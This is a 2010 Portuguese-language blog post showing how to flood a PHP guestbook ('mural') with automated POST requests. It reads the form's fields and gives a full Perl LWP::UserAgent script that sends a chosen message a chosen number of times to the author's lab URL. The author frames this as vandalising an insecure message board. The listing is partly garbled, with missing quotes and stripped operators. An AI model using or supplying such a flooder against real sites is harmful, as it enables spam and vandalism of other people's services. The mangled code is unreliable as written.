---
layout: default
title: Floodando mural com Perl
date: 2010-11-29 15:32
author: brennords
comments: true
categories: [Hacking]
---

Porra, cada vez mais que eu uso perl, mas vejo o quanto de coisas que dá pra se fazer usando o mesmo, final de semana passado, começei a ver o que daria pra fazer com sites usando perl.

Usando a <a href="http://search.cpan.org/~gaas/libwww-perl-5.837/lib/LWP/UserAgent.pm" target="_blank">LWP::UserAgent</a>, o céu é o limite :P

Vou exemplificar aqui nesse post como esquematizar o ataque, e como usar o código, resolvi fazer isso depois de ver que matérias sobre Perl em português não são muito comuns ...

Basta saber o básico de HTML, saber também como as requisições funcionam, e um pouco de Perl pra entender o post.

Vou usar esse código aqui para simular um ataque: <a href="http://www.codigofonte.net/scripts/php/mural/1381_mural-com-bd-em-txt" target="_blank">http://www.codigofonte.net/scripts/php/mural/1381_mural-com-bd-em-txt</a>

É um mural de recados escrito em PHP, e que não precisa de um banco de dados, os recados são salvos num arquivo txt, o código é simples, vulnerável a XSS, mas isso não vem ao caso, ele só vai nos servir de exemplo, pra mostrar como a coisa funciona.

Primeiramente você deve colocar o mural hospedado em algum lugar, você pode instalar um servidor web com o PHP fácil no seu próprio computador, existem pacotes como o <a href="http://www.codigofonte.net/scripts/php/mural/1381_mural-com-bd-em-txt" target="_blank">XAMPP</a>, ou uma maneira mais fácil é você criar uma conta em algum desses servidores de hospedagem gratuitos com suporte a PHP que existem por ai a fora, sinceramente gosto muito do <a href="http://www.freewebhostingarea.com/" target="_blank">http://www.freewebhostingarea.com/</a>.

Caso queira, você pode usar o meu lab pessoal: <a href="http://ripper.eu5.org/labs/uploads/mural/index.php" target="_blank">http://ripper.eu5.org/labs/uploads/mural/index.php</a>, agora não garanto que esteja on-line pra sempre.

Ok, agora temos o mural funcionando, recados podem ser mandados para o site, basta pôr um nome, e-mail e a mensagem desejada...

Mas e se quisermos vandalizar o mural inseguro? Existem várias maneiras, mas vou te dizer como fazer isso com o perl.

Analizando o código, achei a seguinte linha interessante:
<p id="line1">FORM name=email2 onsubmit="return checkemail()" action=enviar_msg.php?a=confirma method=post
São os paramêtros do form que envia a mensagem para o mural de recados, vou destacar logo o que importa, o paramêtro "action" e o "method", nos diz que usando o método POST o form envia os dados para a página "enviar_msg.php?a=confirma".

Sim, mas e dai?

Com o perl podemos enviar requisições para o servidor, é o que vamos fazer.

Analisando ainda mais o código, observa-se que existem três inputs no form:

INPUT id=nome

INPUT id=email

INPUT id=message

O que nos importa são as ID's, é o que vai se usar no código perl para enviar o post.

Ok, agora sabemos que o form envia para a página enviar_msg.php junto com o paramêtro a=confirma, o nome, email e message.

Agora é que entra o perl, não vou explicar muito porque não tô afim, mas se você provavelmente entendeu até aqui, vai entender o código:

```

#!/usr/bin/perl

use LWP::UserAgent;

print Floodando com perl\n;

print Coloque sua mensagem: ;
my $msg = STDIN; chomp $msg;

print \nColoque o numero de vezes que a msg sera enviada: ;
my $count = STDIN; chomp $count;
my $begin = 1;

while ($begin = $count) {

$U=http://ripper.eu5.org/labs/uploads/mural/enviar_msg.php?a=confirma;
$lwp=LWP::UserAgent-new;
$res=$lwp  -post($U,[
'nome'     ='Brenn0',
'email'   ='whatever@gmail.com',
'mensagem' =$msg . $begin,
]);

$begin++;
print Mensagem numero  . $begin .  enviada...\n;
}

print \nFlood Completo!\n;
print Coded By Brenn0 (:;
exit 0;

# http://brenn0.wordpress.com

```

Básico, 32 linhas de código contando as que ficaram em branco, para um mal programador como eu, até que ficou organizadinho.

Atente para a parte do código onde se inicia o While e até onde ele termina, é ali que mora a parte legal, é onde se monta e se envia a requisição, a graça disso não é sair flodando todo e qualquer mural que se achar por ai, mas o poder que o perl dá em fazer algumas coisas, como automatizar tarefas repetitivas, claro que poderiamos ter feito isso de outras maneiras, como usando a extensão Imacs do firefox, mas nem sempre o mais fácil é mais legal :P

Eeee, fim de post, depois de um longo periodo de tempo sem nada, pensando bem não faz lá muito tempo, o mês é que foi longo, o cefet continua tentando me matar, e eu também continuo tentando o mesmo ...

Enfim, sono, preguiça e estudos, alcool, ociosidade, insanidade, são uma boa combinação (:
